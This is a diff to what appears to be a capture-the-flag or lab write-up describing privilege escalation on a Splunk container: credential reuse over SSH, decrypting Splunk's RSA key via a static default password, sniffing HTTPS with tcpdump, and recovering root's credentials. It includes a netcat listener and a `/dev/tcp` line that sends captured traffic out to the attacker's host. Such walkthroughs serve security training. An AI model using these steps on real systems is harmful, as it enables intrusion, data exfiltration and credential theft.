@@ -40,12 +40,22 @@ Doing a light bruteforce against the `admin2` user on the web container, we find
 
 <img src="images/access2.png">
 
-Let's immediately test for credential reuse. We can pivot into the Splunk container with `ssh`.
+Let's immediately test for credential reuse. We can pivot into the Splunk container with `ssh`. Running `id` shows we're in the `sudo` group, and we know the user's password. 
 
 <img src="images/sudo.png">
-
-The file `opt/splunk/etc/auth/server.pem` contains the certificate and encrypted RSA private keys generated when splunk is first installed on the machine.
+Running `sudo -l`, we find we can run `tcpdump` on localhost and can list directories and read any file in `/opt/splunk`. The file `opt/splunk/etc/auth/server.pem` contains the certificate and encrypted RSA private keys generated when splunk is first installed on the machine. We may be able to use this to decrypt HTTPS traffic between clients the server.
 
 <img src="images/sslpass.png">
 
 The password used to encrypt the above RSA key is static across splunk instances however and is in cleartext in `/opt/splunk/etc/system/default/server.pem`. I'll copy the key over to my box in a file `enc.pem` and run `openssl rsa -in enc.pem -out dec.pem` which will prompt me for the `sslPassword` and write the decrypted key to `dec.pem`
+
+<img src="images/traffic.png">
+
+Back on the box I let `tcpdump` run for a short while and sent the output to `output.pcap`. I can copy this file to the host by running `nc -nvlp 7777 >
+output.pcap` on my box and `cat output.pcap > /dev/tcp/172.18.0.1/7777` on the victim.
+
+<img src="images/root_creds.png">
+
+Now I'll use `tshark` to try and decrypt the traffic using the plaintext RSA private key. 'Grepping' for known headers, we can spot the basic authorization header which reveals root's credentials. Run `su -` and its job done.
+
+Finally run `sudo iptables -D OUTPUT -s 172.18.0.1 -d 172.18.0.3 -j DROP` to delete the iptables rule set in `start.sh`.
